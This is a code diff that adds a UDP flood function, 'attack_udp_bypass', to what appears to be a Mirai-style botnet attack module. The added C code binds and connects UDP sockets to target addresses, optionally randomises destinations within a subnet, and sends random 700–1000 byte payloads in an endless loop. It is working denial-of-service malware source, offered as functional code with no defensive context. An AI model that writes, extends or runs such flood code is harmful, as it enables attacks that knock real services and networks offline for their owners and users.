@@ -372,6 +372,113 @@ void attack_udp_plain(uint8_t targs_len, struct attack_target *targs, uint8_t op
     free(fds);
 }
 
+void attack_udp_bypass(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
+{
+    int i;
+    char **pkts = calloc(targs_len, sizeof (char *));
+    if (pkts == NULL) return;
+    
+    int *fds = calloc(targs_len, sizeof (int));
+    if (fds == NULL)
+    {
+        free(pkts);
+        return;
+    }
+
+    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
+    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
+
+    struct sockaddr_in bind_addr = {0};
+
+    if (sport == 0xffff)
+    {
+        sport = rand_next();
+    } else {
+        sport = htons(sport);
+    }
+
+    for (i = 0; i < targs_len; i++)
+    {
+        fds[i] = -1;
+        pkts[i] = calloc(65535, sizeof (char));
+        if (pkts[i] == NULL) {
+            fds[i] = -1;
+            for (int j = 0; j < i; j++) {
+                free(pkts[j]);
+            }
+            for (int j = 0; j < i; j++) {
+                if (fds[j] != -1) close(fds[j]);
+            }
+            free(pkts);
+            free(fds);
+            return;
+        }
+
+        if (dport == 0xffff)
+            targs[i].sock_addr.sin_port = htons(rand_next());
+        else
+            targs[i].sock_addr.sin_port = htons(dport);
+
+        if ((fds[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1)
+        {
+            fds[i] = -1;
+            for (int j = 0; j <= i; j++) {
+                free(pkts[j]);
+            }
+            for (int j = 0; j < i; j++) {
+                if (fds[j] != -1) close(fds[j]);
+            }
+            free(pkts);
+            free(fds);
+            return;
+        }
+
+        bind_addr.sin_family = AF_INET;
+        bind_addr.sin_port = sport;
+        bind_addr.sin_addr.s_addr = 0;
+
+        if (bind(fds[i], (struct sockaddr *)&bind_addr, sizeof (struct sockaddr_in)) == -1) {
+            close(fds[i]);
+            fds[i] = -1;
+            continue;
+        }
+
+        if (targs[i].netmask < 32)
+            targs[i].sock_addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
+
+        if (connect(fds[i], (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in)) == -1) {
+            close(fds[i]);
+            fds[i] = -1;
+            continue;
+        }
+    }
+
+    while (TRUE)
+    {
+        for (i = 0; i < targs_len; i++)
+        {
+            if (fds[i] == -1) continue;
+            
+            char *data = pkts[i];
+            
+            uint16_t data_len = rand_next_range(700, 1000);
+            rand_str(data, data_len);
+
+            send(fds[i], data, data_len, MSG_NOSIGNAL);
+        }
+    }
+    
+    // Cleanup
+    for (i = 0; i < targs_len; i++) {
+        free(pkts[i]);
+        if (fds[i] != -1) {
+            close(fds[i]);
+        }
+    }
+    free(pkts);
+    free(fds);
+}
+
 void attack_udp_rand(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
 {
     int i, fd;
